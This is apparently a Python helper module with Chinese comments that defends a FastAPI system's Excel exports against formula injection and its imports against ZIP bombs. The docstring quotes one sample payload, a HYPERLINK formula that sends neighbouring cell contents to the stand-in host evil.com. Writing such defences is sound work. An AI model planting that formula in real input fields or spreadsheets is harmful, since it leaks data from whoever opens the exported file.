# Copyright (c) 2026 Jarrett Merrick Zhang (zjm20@vip.qq.com)
# Licensed under the MIT License. See LICENSE file for details.

"""Excel 导出/导入的安全辅助。

【背景 · 公式注入（Formula / CSV Injection）】
    Excel 会把以 `=` `+` `-` `@` 开头（以及以 Tab / CR 开头）的单元格内容**当作公式解析**。
    本系统多处导出（科室、标识、维修记录、审计日志）的数据直接来自用户输入，
    攻击者只要把「科室名称」之类字段填成：

        =HYPERLINK("https://evil.com/leak?d="&A1&"&B1","点我")

    导出的 .xlsx 被他人打开时，Excel 会解析该公式并可读取同行其它单元格内容外发
    （Hyperlink 方式在部分 Excel 版本/受信任位置下不会弹窗拦截），
    属于典型的**存储型**风险：注入点在录入侧，触发点在导出的下载者侧。

    处置（OWASP 推荐做法）：对以危险字符开头的字符串加**单引号前缀** ——
    Excel 会把 `'=...` 视为文本而非公式（单引号本身不显示）。
    注意排除纯数字/日期：`-5`、`+3`、`-1.5e3` 是合法数值，加前缀反而破坏数据。

【背景 · 解压炸弹（ZIP Bomb）】
    .xlsx 本质是 ZIP 容器。攻击者可构造压缩比极高的文件（几十 KB 解压出数 GB），
    使导入接口在 openpyxl 解析时耗尽内存。原有的「文件大小 + 魔数」校验拦不住它，
    因为校验的是**压缩后**大小。因此在解析前需校验**解压后**的总大小与压缩比。
"""

from __future__ import annotations

import io
import logging
import zipfile
from typing import Any, Iterable

from fastapi import HTTPException

logger = logging.getLogger(__name__)

# 触发 Excel 公式解析的危险起始字符
_DANGEROUS_PREFIXES = ("=", "+", "-", "@", "\t", "\r")

# 解压后允许的最大总字节数（200MB）。普通业务表格远小于此值；
# 一旦超过，基本可判定为构造文件而非正常业务数据。
_MAX_UNCOMPRESSED_BYTES = 200 * 1024 * 1024

# 允许的最大压缩比。正常 xlsx（XML 文本）压缩比通常在 5:1 ~ 20:1，
# 取 120 已相当宽松，只用于拦截极端构造（如 1000:1 的炸弹）。
_MAX_COMPRESSION_RATIO = 120


def _is_plain_number(text: str) -> bool:
    """判断字符串是否为纯数值（含负号/正号/小数/科学计数法）。

    这类值以 `-` `+` 开头是正常业务数据（如 -5、+3.2、-1e4），
    必须排除在转义之外，否则会把数值变成文本、破坏下游计算。
    """
    try:
        float(text)
        return True
    except (TypeError, ValueError):
        return False


def escape_excel_value(value: Any) -> Any:
    """转义单个单元格值，阻断 Excel 公式注入。

    对以危险字符开头、且**不是纯数值**的字符串加单引号前缀，
    使 Excel 按文本处理。非字符串（数字 / 日期 / None）原样返回。
    """
    if not isinstance(value, str) or not value:
        return value
    if not value.startswith(_DANGEROUS_PREFIXES):
        return value
    # `-100` / `+3.14` 这类是数值，不能加前缀
    if _is_plain_number(value):
        return value
    return "'" + value


def append_safe(ws, values: Iterable[Any]) -> None:
    """`ws.append()` 的安全包装：逐格转义后再写入。

    导出统一走本函数，避免遗漏某一路导出而留下注入面。
    表头等固定文案经转义后无变化，因此可无差别调用。
    """
    ws.append([escape_excel_value(v) for v in values])


def assert_safe_zip(contents: bytes, *, filename: str = "") -> None:
    """在交给 openpyxl 解析前，校验 ZIP 容器是否可能为解压炸弹。

    仅对 .xlsx（ZIP 容器）生效；.xls 是 OLE2 复合文档，不走本检查。
    校验两项：
      ① 解压后总大小是否超过阈值；
      ② 整体压缩比是否异常。
    命中任一项即抛 400，避免解析阶段耗尽内存。

    说明：这里读的是 ZIP 中央目录中声明的 `file_size`（未真正解压），
    成本极低；即便声明值被伪造，后续 openpyxl 的实际读取量也会受
    「文件大小上限 + 阈值」双重约束，不会无限膨胀。
    """
    if not contents.startswith(b"PK\x03\x04"):
        return  # .xls 或非 ZIP，交由调用方的其它校验处理

    try:
        with zipfile.ZipFile(io.BytesIO(contents)) as zf:
            infos = zf.infolist()
            total_uncompressed = sum(i.file_size for i in infos)
            total_compressed = sum(i.compress_size for i in infos) or 1
    except zipfile.BadZipFile:
        raise HTTPException(status_code=400, detail="文件已损坏或不是有效的 Excel 文件")

    # 条目数过多同样是构造特征（正常 xlsx 的条目数在几十个量级）
    if len(infos) > 2000:
        logger.warning(
            "拒绝疑似构造的 Excel 文件（%s）：条目数 %d 异常", filename or "(未命名)", len(infos)
        )
        raise HTTPException(status_code=400, detail="文件结构异常，已拒绝解析")

    if total_uncompressed > _MAX_UNCOMPRESSED_BYTES:
        logger.warning(
            "拒绝疑似解压炸弹的 Excel 文件（%s）：解压后 %.1fMB 超限",
            filename or "(未命名)",
            total_uncompressed / 1024 / 1024,
        )
        raise HTTPException(
            status_code=400,
            detail=f"文件解压后过大（超过 {_MAX_UNCOMPRESSED_BYTES // 1024 // 1024}MB），已拒绝解析",
        )

    ratio = total_uncompressed / total_compressed
    if ratio > _MAX_COMPRESSION_RATIO:
        logger.warning(
            "拒绝疑似解压炸弹的 Excel 文件（%s）：压缩比 %.0f:1 异常",
            filename or "(未命名)",
            ratio,
        )
        raise HTTPException(status_code=400, detail="文件压缩比异常，已拒绝解析")
